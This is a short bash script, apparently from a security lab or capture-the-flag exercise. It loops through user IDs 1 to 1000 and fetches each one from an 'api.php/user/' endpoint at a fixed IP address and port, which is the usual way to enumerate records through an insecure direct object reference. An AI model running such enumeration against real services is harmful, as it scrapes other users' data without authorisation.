#!/bin/bash

for i in {1..1000}; do
  curl "http://94.237.54.176:59382/api.php/user/$i"
  echo ""
done
